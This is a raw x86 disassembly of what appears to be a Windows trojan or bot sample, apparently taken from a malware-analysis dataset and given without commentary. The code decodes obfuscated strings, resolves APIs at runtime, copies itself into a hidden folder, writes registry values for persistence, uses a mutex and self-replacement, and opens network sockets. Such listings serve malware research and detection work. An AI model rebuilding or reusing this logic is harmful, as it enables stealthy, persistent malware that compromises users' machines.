sub_401000
push ebp
mov ebp esp
push 0xffffffff
push sub_407880
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call sub_4010b0
mov [ ebp - 0x4 ] 0x0
call sub_401310
test eax eax
jne r-xdata
call sub_403250
call [ Ordinal_WSOCK32_116@IAT ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_401080
push esi
mov esi [ esp + 0xc ]
xor eax eax
test esi esi
jle r-xdata
pop esi
retn
mov ecx [ esp + 0x8 ]
mov dl [ eax + ecx ]
xor dl 0x11
sub dl 0x25
mov [ eax + ecx ] dl
inc eax
cmp eax esi
jl r-xdata
sub_4010b0
push esi
push edi
push 0x6
push rw-data
call sub_401080
push 0x8
push rw-data
call sub_401080
push 0x20
push rw-data
call sub_401080
push 0x24
push rw-data
call sub_401080
push 0x3f
push rw-data
call sub_401080
push 0xb
push rw-data
call sub_401080
push 0xd
push rw-data
call sub_401080
push 0x11
push rw-data
call sub_401080
add esp 0x40
push 0x10
push rw-data
call sub_401080
push 0xc
push rw-data
call sub_401080
push 0x16
push rw-data
call sub_401080
push 0xb
push rw-data
call sub_401080
push 0x8
push rw-data
call sub_401080
push 0x8
push rw-data
call sub_401080
push 0x8
push rw-data
call sub_401080
push 0xa
push rw-data
call sub_401080
add esp 0x40
push 0xd
push rw-data
call sub_401080
push 0x8
push rw-data
call sub_401080
push 0xf
push rw-data
call sub_401080
push 0xe
push rw-data
call sub_401080
push 0xe
push rw-data
call sub_401080
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xfffffff8
push ecx
push rw-data
call sub_401080
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xfffffff8
push ecx
push rw-data
call sub_401080
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xfffffff8
push ecx
push rw-data
call sub_401080
mov edi rw-data
or ecx 0xffffffff
xor eax eax
add esp 0x40
[ edi ]
not ecx
add ecx 0xfffffff8
push ecx
push rw-data
call sub_401080
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xfffffff8
push ecx
push rw-data
call sub_401080
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xfffffff8
push ecx
push rw-data
call sub_401080
push 0x16
push rw-data
call sub_401080
push 0xb
push rw-data
call sub_401080
push 0xb
push rw-data
call sub_401080
push 0xc
push rw-data
call sub_401080
push 0x13
push rw-data
call sub_401080
add esp 0x40
push 0xd
push rw-data
call sub_401080
push 0x12
push rw-data
call sub_401080
push 0xa
push rw-data
call sub_401080
push 0x9
push rw-data
call sub_401080
push 0xd
push rw-data
call sub_401080
add esp 0x28
mov esi rw-data
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push esi
call sub_401080
add esi 0x10
add esp 0x8
cmp esi rw-data
jl r-xdata
pop edi
pop esi
retn
sub_401310
push ecx
push ebx
push ebp
mov ebp [ LoadLibraryA@IAT ]
push esi
push edi
push rw-data
call ebp
mov ebx [ GetProcAddress@IAT ]
mov esi eax
push rw-data
push esi
call ebx
push rw-data
push esi
mov [ rw-data ] eax
call ebx
push rw-data
push esi
mov [ rw-data ] eax
call ebx
push rw-data
push esi
mov [ rw-data ] eax
call ebx
push rw-data
push esi
mov [ rw-data ] eax
call ebx
push rw-data
push esi
mov [ rw-data ] eax
call ebx
push rw-data
push esi
mov [ rw-data ] eax
call ebx
push rw-data
push esi
mov [ rw-data ] eax
call ebx
push rw-data
push esi
mov [ rw-data ] eax
call ebx
push rw-data
push esi
mov [ rw-data ] eax
call ebx
push rw-data
push esi
mov [ rw-data ] eax
call ebx
push rw-data
push esi
mov [ rw-data ] eax
call ebx
push rw-data
push esi
mov [ rw-data ] eax
call ebx
push rw-data
push esi
mov [ rw-data ] eax
call ebx
push rw-data
push esi
mov [ rw-data ] eax
call ebx
push rw-data
push esi
mov [ rw-data ] eax
call ebx
mov edi [ FreeLibrary@IAT ]
push esi
mov [ rw-data ] eax
call edi
push rw-data
call ebp
mov esi eax
push rw-data
push esi
call ebx
push rw-data
push esi
mov [ rw-data ] eax
call ebx
push esi
mov [ rw-data ] eax
call edi
or ecx 0xffffffff
mov edi rw-data
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi rw-data
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
shr ecx 0x2
mov edi rw-data
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi rw-data
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
or ecx 0xffffffff
mov edi rw-data
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
or ecx 0xffffffff
mov edi rw-data
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi rw-data
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
or ecx 0xffffffff
mov edi rw-data
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
or ecx 0xffffffff
mov edi rw-data
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi rw-data
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push rw-data
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi rw-data
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
or ecx 0xffffffff
mov edi rw-data
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
call ebp
mov esi eax
test esi esi
jne r-xdata
push rw-data
push esi
call ebx
push esi
mov edi eax
call [ FreeLibrary@IAT ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push rw-data
push 0x0
push 0x0
push 0x0
call edi
push rw-data
push 0x0
push 0x0
push 0x0
mov [ rw-data ] eax
call edi
push rw-data
push 0x0
push 0x0
push 0x0
mov [ rw-data ] eax
call edi
mov [ rw-data ] eax
call sub_401a40
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
push rw-data
call sub_402050
call sub_402090
neg eax
sbb eax eax
push 0x0
neg eax
mov [ rw-data ] eax
call sub_401a60
call sub_401db0
call sub_403830
call sub_407630
call sub_402a50
call sub_402f20
call sub_403060
call sub_401920
mov esi [ malloc@IAT ]
push 0x2000
call esi
add esp 0xc
mov [ rw-data ] eax
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push 0x2000
call esi
add esp 0x4
mov [ rw-data ] eax
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
lea eax [ esp + 0x10 ]
push eax
push 0x0
push 0x0
push sub_403dd0
push 0x0
push 0x0
call [ CreateThread@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
sub_401920
sub esp 0x200
lea eax [ esp + 0x100 ]
push ebx
push ebp
push esi
push edi
push 0x100
push eax
push 0x0
call [ rw-data ]
lea ecx [ esp + 0x10 ]
push 0x100
push ecx
call [ rw-data ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
push eax
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x14 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ CreateDirectoryA@IAT ]
lea ecx [ esp + 0x10 ]
push ecx
call [ GetFileAttributesA@IAT ]
mov ebx [ SetFileAttributesA@IAT ]
or al 0x2
lea edx [ esp + 0x10 ]
push eax
push edx
call ebx
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
push eax
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0x114 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call ebx
lea ecx [ esp + 0x10 ]
push 0x0
lea edx [ esp + 0x114 ]
push ecx
push edx
call [ CopyFileA@IAT ]
lea eax [ esp + 0x110 ]
push eax
call sub_405ff0
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x200
retn
sub_401a10
push esi
mov esi [ esp + 0x8 ]
push 0x0
push esi
call [ CreateDirectoryA@IAT ]
push esi
call [ GetFileAttributesA@IAT ]
or al 0x6
push eax
push esi
call [ SetFileAttributesA@IAT ]
pop esi
retn
sub_401a60
sub esp 0x288
push ebp
push esi
xor esi esi
lea eax [ esp + 0x8 ]
push esi
push eax
push esi
push 0x2001f
push esi
push rw-data
push esi
push rw-data
push 0x80000002
mov [ esp + 0x30 ] 0x80
call [ RegCreateKeyExA@IAT ]
mov eax [ esp + 0x8 ]
mov ebp [ RegQueryValueExA@IAT ]
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x10 ]
push ecx
push edx
push esi
push esi
push rw-data
push eax
call ebp
test eax eax
jne r-xdata
push edi
lea ecx [ esp + 0x94 ]
push 0x200
push ecx
push 0x0
call [ rw-data ]
lea edx [ esp + 0x94 ]
push 0x5c
push edx
call [ strrchr@IAT ]
mov edx eax
add esp 0x8
inc edx
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov cl [ edx ]
xor edi edi
test cl cl
je r-xdata
mov al [ esp + 0x10 ]
test al al
je r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
lea edx [ esp + 0x14 ]
push ecx
push edx
push 0x1
push 0x0
push rw-data
push eax
mov [ esp + edi + 0x2c ] 0x0
call [ RegSetValueExA@IAT ]
pop edi
lea esi [ esp + 0x14 ]
mov eax edx
sub esi edx
mov eax [ esp + 0x294 ]
mov [ esi + rw-data ] 0x0
test eax eax
je r-xdata
dec al
mov [ esi + rw-data ] al
mov al [ esp + esi + 0x11 ]
inc esi
test al al
jne r-xdata
mov eax [ esp ]
test eax eax
je r-xdata
push 0x0
call [ time@IAT ]
push eax
call [ srand@IAT ]
add esp 0x8
call [ rand@IAT ]
push 0x4
push rw-data
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
push 0x4
push 0x0
push rw-data
push eax
call [ RegSetValueExA@IAT ]
inc cl
inc edi
mov [ esi + eax ] cl
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov edx [ esp + 0x8 ]
lea ecx [ esp + 0xc ]
push ecx
push rw-data
push 0x0
push 0x0
push rw-data
push edx
call ebp
pop esi
pop ebp
test eax eax
je r-xdata
add esp 0x288
retn
push eax
call [ RegCloseKey@IAT ]
sub_401bf0
sub esp 0x204
lea eax [ esp + 0x4 ]
push ebx
push ebp
push esi
push edi
push 0x200
push eax
call [ rw-data ]
or ecx 0xffffffff
mov edi rw-data
xor eax eax
lea edx [ esp + 0x17 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi edx
lea edx [ esp + 0x14 ]
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
push eax
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov ebx ecx
mov esi edi
or ecx 0xffffffff
mov edi edx
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea edx [ esp + 0x18 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea edx [ esp + 0x18 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x14 ]
and ecx 0x3
[ edi ] [ esi ]
mov esi [ RegCreateKeyExA@IAT ]
push eax
push 0x0
push 0x2001f
push 0x0
push rw-data
push 0x0
push rw-data
push 0x80000002
call esi
mov ebx [ esp + 0x21c ]
cmp ebx 0x1
jne r-xdata
mov ebp [ esp + 0x218 ]
mov eax [ esp + 0x10 ]
push ebp
push eax
call [ RegDeleteValueA@IAT ]
lea edi [ esp + 0x14 ]
or ecx 0xffffffff
xor eax eax
mov ebp [ esp + 0x218 ]
[ edi ]
not ecx
mov edx [ esp + 0x10 ]
dec ecx
push ecx
lea ecx [ esp + 0x18 ]
push ecx
push ebx
push ebp
push eax
push edx
call [ SHSetValueA@IAT ]
jmp r-xdata
lea ecx [ esp + 0x10 ]
push 0x0
push ecx
push 0x0
push 0x2001f
push 0x0
push rw-data
push 0x0
push rw-data
push 0x80000001
call esi
cmp ebx 0x1
jne r-xdata
push eax
call [ RegCloseKey@IAT ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
push ebp
push ecx
call [ RegDeleteValueA@IAT ]
lea edi [ esp + 0x14 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x14 ]
[ edi ]
not ecx
dec ecx
push ecx
push edx
push ebx
push ebp
push eax
mov eax [ esp + 0x24 ]
push eax
call [ SHSetValueA@IAT ]
jmp r-xdata
add esp 0x204
retn
push eax
call [ RegCloseKey@IAT ]
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
test eax eax
pop ebx
je r-xdata
sub_401db0
sub esp 0x510
push rw-data
push 0x0
push 0x1f0001
call [ OpenMutexA@IAT ]
test eax eax
je r-xdata
push rw-data
push 0x0
push 0x0
call [ CreateMutexA@IAT ]
push ebx
push esi
push edi
lea edx [ esp + 0x31c ]
push 0x200
push edx
push 0x0
call [ rw-data ]
push 0x1
lea eax [ esp + 0x20 ]
push 0x26
push eax
push 0x0
call [ SHGetSpecialFolderPathA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x1c ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x1c ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_401a10
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x20 ]
[ edi ]
not ecx
sub edi ecx
push 0x2e
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea edx [ esp + 0x24 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x24 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
mov esi [ strrchr@IAT ]
call esi
lea ecx [ esp + 0x328 ]
push 0x2e
push ecx
mov [ eax ] 0x0
call esi
add esp 0x14
mov [ eax ] 0x0
lea edx [ esp + 0x1c ]
lea eax [ esp + 0x31c ]
push edx
push eax
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
push eax
call [ CloseHandle@IAT ]
mov eax [ rw-data ]
push eax
call [ SetEvent@IAT ]
mov ecx [ rw-data ]
push 0x1388
push ecx
call [ WaitForSingleObject@IAT ]
push 0x1f4
call [ Sleep@IAT ]
push 0x1
push rw-data
call sub_401bf0
push 0x1
call sub_401a60
add esp 0xc
pop edi
pop esi
pop ebx
add esp 0x510
retn
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x31c ]
[ edi ]
not ecx
sub edi ecx
push ebp
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
mov ebx [ SetFileAttributesA@IAT ]
push eax
and ecx 0x3
lea eax [ esp + 0x24 ]
[ edi ] [ esi ]
push eax
call ebx
movsx ecx [ esp + 0x320 ]
push ecx
lea edx [ esp + 0x14 ]
push rw-data
push edx
call [ sprintf@IAT ]
mov esi [ CopyFileA@IAT ]
add esp 0xc
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x320 ]
push 0x0
push eax
push ecx
call esi
lea edx [ esp + 0x20 ]
push 0x0
lea eax [ esp + 0x14 ]
push edx
push eax
call esi
mov ebp [ DeleteFileA@IAT ]
lea ecx [ esp + 0x10 ]
push ecx
call ebp
lea edi [ esp + 0x20 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x220 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x220 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push eax
and ecx 0x3
lea eax [ esp + 0x224 ]
[ edi ] [ esi ]
push eax
call ebx
lea ecx [ esp + 0x220 ]
push ecx
call ebp
lea edx [ esp + 0x220 ]
lea eax [ esp + 0x20 ]
push edx
push eax
call [ rename@IAT ]
lea ecx [ esp + 0x28 ]
push ecx
call sub_406c10
add esp 0xc
push 0x1
call [ exit@IAT ]
sub_402050
push esi
mov esi [ esp + 0x8 ]
push edi
mov ecx 0x27
xor eax eax
mov edi esi
[ edi ]
push esi
mov [ esi ] 0x9c
call [ rw-data ]
test eax eax
jne r-xdata
call [ GetSystemDefaultLangID@IAT ]
pop edi
mov [ rw-data ] ax
pop esi
retn
push esi
mov [ esi ] 0x94
call [ rw-data ]
sub_402090
sub esp 0x108
push esi
lea eax [ esp + 0x4 ]
push edi
push eax
push 0x1
push 0x0
push rw-data
push 0x80000001
mov [ esp + 0x20 ] 0x4
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
pop edi
xor eax eax
pop esi
add esp 0x108
retn
mov edx [ esp + 0x8 ]
mov esi [ RegQueryValueExA@IAT ]
lea ecx [ esp + 0xc ]
push ecx
push rw-data
push eax
push eax
push rw-data
push edx
call esi
mov edx [ esp + 0x8 ]
mov edi eax
lea eax [ esp + 0xc ]
lea ecx [ esp + 0x10 ]
push eax
push ecx
push 0x0
push 0x0
push rw-data
push edx
mov [ esp + 0x24 ] 0x100
call esi
mov esi eax
mov eax [ esp + 0x8 ]
push eax
call [ RegCloseKey@IAT ]
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
lea ecx [ esp + 0x10 ]
push rw-data
push ecx
call [ strstr@IAT ]
mov edi eax
add esp 0x8
test edi edi
je r-xdata
lea edi [ esp + 0x10 ]
add edi 0x5
jmp r-xdata
push 0x3a
push edi
call [ strchr@IAT ]
mov edx eax
or ecx 0xffffffff
xor eax eax
mov [ edx ] 0x0
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
inc edx
[ edi ] [ esi ]
push edx
call [ atoi@IAT ]
add esp 0xc
mov [ rw-data ] eax
mov eax 0x1
pop edi
pop esi
add esp 0x108
retn
sub_4021a0
mov eax 0x2120
call sub_4076c0
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x2134 ]
push edi
call sub_4038f0
add esp 0x4
push eax
call [ Ordinal_WSOCK32_10@IAT ]
mov ebp [ esp + 0x2138 ]
push 0x0
push 0x1
push 0x2
mov esi eax
call [ Ordinal_WSOCK32_23@IAT ]
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x2120
retn
lea eax [ esp + 0x18 ]
mov [ esp + 0x18 ] 0x1
push eax
push 0x8004667e
push ebx
call [ Ordinal_WSOCK32_12@IAT ]
mov eax [ rw-data ]
mov [ esp + 0x10 ] 0x3c
test eax eax
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x30 ] ebx
mov [ esp + 0x2c ] 0x1
je r-xdata
push ebp
mov [ esp + 0x20 ] 0x2
call [ Ordinal_WSOCK32_9@IAT ]
lea ecx [ esp + 0x1c ]
push 0x10
push ecx
push ebx
mov [ esp + 0x2a ] ax
mov [ esp + 0x2c ] esi
call [ rw-data ]
lea edx [ esp + 0x10 ]
lea ecx [ esp + 0x2c ]
push edx
push 0x0
lea eax [ ebx + 0x1 ]
push ecx
push 0x0
push eax
call [ Ordinal_WSOCK32_18@IAT ]
test eax eax
jle r-xdata
push rw-data
call [ Ordinal_WSOCK32_10@IAT ]
mov ebp [ rw-data ]
mov esi eax
push ebx
mov ebp [ esp + 0x2144 ]
mov edx [ esp + 0x2150 ]
mov eax [ esp + 0x213c ]
mov ecx [ esp + 0x2138 ]
push ebp
push edx
push eax
push ecx
lea edx [ esp + 0x140 ]
push edi
push edx
call sub_403460
lea edi [ esp + 0x148 ]
or ecx 0xffffffff
xor eax eax
add esp 0x18
[ edi ]
not ecx
mov esi [ esp + 0x2140 ]
dec ecx
mov eax ecx
mov ecx ebp
mov edx ecx
push 0x0
lea edi [ esp + eax + 0x134 ]
add eax ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push eax
lea eax [ esp + 0x138 ]
and ecx 0x3
push eax
push ebx
[ edi ] [ esi ]
call [ rw-data ]
cmp [ esp + 0x2150 ] 0x1
jne r-xdata
push ebx
call sub_403720
add esp 0x4
cmp eax 0xffffffff
je r-xdata
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x2c ]
push ecx
push 0x0
push edx
lea eax [ ebx + 0x1 ]
push 0x0
push eax
call [ Ordinal_WSOCK32_18@IAT ]
test eax eax
push ebx
jle r-xdata
cmp eax 0x3e800
jge r-xdata
call [ Ordinal_WSOCK32_3@IAT ]
call [ Ordinal_WSOCK32_3@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x2120
retn
mov edi [ esp + 0x2148 ]
mov ebp [ Ordinal_WSOCK32_16@IAT ]
xor esi esi
mov edx 0x3e800
push 0x0
sub edx esi
lea eax [ esi + edi ]
push edx
push eax
push ebx
call ebp
cmp eax 0xffffffff
je r-xdata
test eax eax
je r-xdata
push ebx
call [ Ordinal_WSOCK32_3@IAT ]
mov ecx [ esp + 0x214c ]
pop edi
mov eax 0x1
mov [ ecx ] esi
pop esi
pop ebp
pop ebx
add esp 0x2120
retn
add esi eax
cmp esi 0x3e800
jl r-xdata
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x2c ]
push eax
push 0x0
push 0x0
lea eax [ ebx + 0x1 ]
push ecx
push eax
call [ Ordinal_WSOCK32_18@IAT ]
test eax eax
jle r-xdata
sub_4023d0
push ecx
push esi
push 0x3e800
call [ malloc@IAT ]
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
lea eax [ esp + 0x4 ]
push 0x0
push eax
push esi
push 0x0
push rw-data
push rw-data
push 0x50
push rw-data
